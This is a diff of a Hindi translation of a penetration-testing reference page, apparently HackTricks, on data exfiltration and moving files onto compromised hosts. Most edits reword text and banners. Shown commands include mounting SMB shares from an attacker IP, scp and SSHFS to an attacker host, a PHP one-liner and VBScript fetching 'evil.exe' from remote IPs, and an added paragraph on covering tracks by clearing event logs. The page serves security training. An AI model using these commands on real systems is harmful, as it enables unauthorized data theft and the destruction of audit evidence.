@@ -7,18 +7,26 @@
 दूसरे तरीके HackTricks का समर्थन करने के लिए:
 
 * अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS & HackTricks swag प्राप्त करें**](https://peass.creator-spring.com)
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
+* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
 * **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
 
 </details>
 
-## सामान्य रूप से सफेद सूचीबद्ध डोमेन जानकारी निकालने के लिए
+**Try Hard Security Group**
 
-[https://lots-project.com/](https://lots-project.com/) जांचें कि कौन से सामान्य रूप से सफेद सूचीबद्ध डोमेन दुरुपयोग किए जा सकते हैं
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-## कॉपी एंड पेस्ट बेस64
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
+## सूचीबद्ध डोमेन्स जिन्हें सूचना निकालने के लिए सफेद सूची में शामिल किया गया है
+
+[https://lots-project.com/](https://lots-project.com/) पर जांच करें कि कौन से सामान्य व्हाइटलिस्टेड डोमेन्स का दुरुपयोग किया जा सकता है
+
+## कॉपी और पेस्ट बेस64
 
 **Linux**
 ```bash
@@ -54,7 +62,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### फ़ाइल अपलोड
+### फ़ाइलें अपलोड करें
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -155,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-काली के रूप में सर्वर
+काली को सर्वर के रूप में उपयोग करें
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -177,19 +185,23 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration
+### Exfiltration Techniques on Windows
 
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
+#### Local Exfiltration
 
-1. **Compression**: Compressing data before exfiltration can help evade detection.
-2. **Encryption**: Encrypting data ensures that even if the exfiltrated data is intercepted, it remains secure.
-3. **Steganography**: Hiding data within other files or images can be a covert way to exfiltrate information.
-4. **DNS Tunneling**: Using DNS requests to tunnel data out of a network is a common exfiltration technique.
-5. **Exfiltration Over Alternative Protocols**: Utilizing protocols other than HTTP/HTTPS for exfiltration can bypass network controls.
-6. **Data Exfiltration via Cloud Services**: Uploading data to cloud storage services can be a stealthy way to exfiltrate information.
-7. **Using External Devices**: USB drives or external hard drives can be used to physically exfiltrate data from a system.
+Local exfiltration techniques involve transferring data to devices within the local network or physically removing data from the target environment.
 
-By understanding these exfiltration methods, security professionals can better protect their systems from data breaches.
+#### Remote Exfiltration
+
+Remote exfiltration techniques involve transferring data to an external location outside the target network, typically controlled by the attacker.
+
+#### Exfiltration Tools
+
+Various tools can be used for exfiltration, such as **Netcat**, **FTP**, **PowerShell**, **BITSAdmin**, and **certutil**.
+
+#### Covering Tracks
+
+After exfiltrating data, it's essential to cover tracks by deleting logs, clearing event logs, and removing any evidence of the exfiltration activity.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -199,13 +211,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-हमलावर को SSHd चल रहा होना चाहिए।
+हमलावर को SSHd चलाना होगा।
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से हमलावर की ओर से एक निर्देशिका माउंट कर सकता है।
+यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से हमलावर तक एक निर्देशिका माउंट कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -284,7 +296,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-वीबीस्क्रिप्ट
+VBScript का उपयोग डेटा अन्य संगठनों में भेजने के लिए किया जा सकता है। VBScript को उपयोग करके डेटा को एक फ़ाइल में लिखा जा सकता है और फिर उस फ़ाइल को एक विदेशी सर्वर पर अपलोड किया जा सकता है।
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -322,7 +334,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## डीबग.एक्सई
 
-`डीबग.एक्सई` प्रोग्राम न केवल बाइनरी की जांच की अनुमति देता है बल्कि **हेक्स से उन्हें पुनः निर्माण करने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी के हेक्स प्रदान करके, `डीबग.एक्सई` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालांकि, यह महत्वपूर्ण है कि डीबग.एक्सई का एक **सीमितांकन है जो 64 केबी बाइट तक की फ़ाइलों को एसेम्बल कर सकता है**।
+`डीबग.एक्सई` प्रोग्राम न केवल बाइनरी की जांच की अनुमति देता है बल्कि **हेक्स से उन्हें पुनः निर्माण करने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी के हेक्स प्रदान करके, `डीबग.एक्सई` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालांकि, यह महत्वपूर्ण है कि डीबग.एक्सई का एक **सीमितांकन है जो 64 केबी बाइट के फ़ाइलों को एकत्रित करने की सीमा है**।
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -332,16 +344,22 @@ wine exe2bat.exe nc.exe nc.txt
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 दूसरे तरीके HackTricks का समर्थन करने के लिए:
 
-* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** को** **फॉलो** करें।
-* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
+* प्राप्त करें [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com)
+* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** पर **फॉलो** करें 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
 
 </details>
